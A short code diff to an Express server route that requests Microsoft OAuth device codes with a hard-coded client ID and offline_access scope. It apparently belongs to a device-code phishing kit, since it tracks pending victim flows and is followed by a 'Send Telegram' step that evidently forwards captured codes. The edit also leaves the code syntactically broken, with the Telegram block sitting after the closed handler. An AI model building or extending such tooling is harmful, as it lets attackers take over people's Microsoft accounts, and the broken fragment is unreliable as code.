@@ -2207,26 +2207,18 @@ app.post('/device/request', async (req, res) => {
             'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
-                scope: 'openid%20profile%20offline_access'
+                scope: 'https://graph.microsoft.com/user.read offline_access'
             }),
             { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
         );
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
-        
-        // Store in deviceFlows
-        const existing = deviceFlows.find(f => f.user_code === data.user_code);
-        if (!existing) {
-            deviceFlows.push({
-                user_code: data.user_code,
-                device_code: data.device_code,
-                session_id: data.device_code,
-                status: 'pending',
-                created: new Date().toISOString(),
-                token_type: 'Device Code',
-                verification_uri: data.verification_uri
-            });
-        }
+        res.json(data);
+    } catch (error) {
+        console.error('❌ Device code error:', error.response?.data || error.message);
+        res.status(500).json({ error: error.response?.data || error.message });
+    }
+});
         
         // Send Telegram
         const message = `
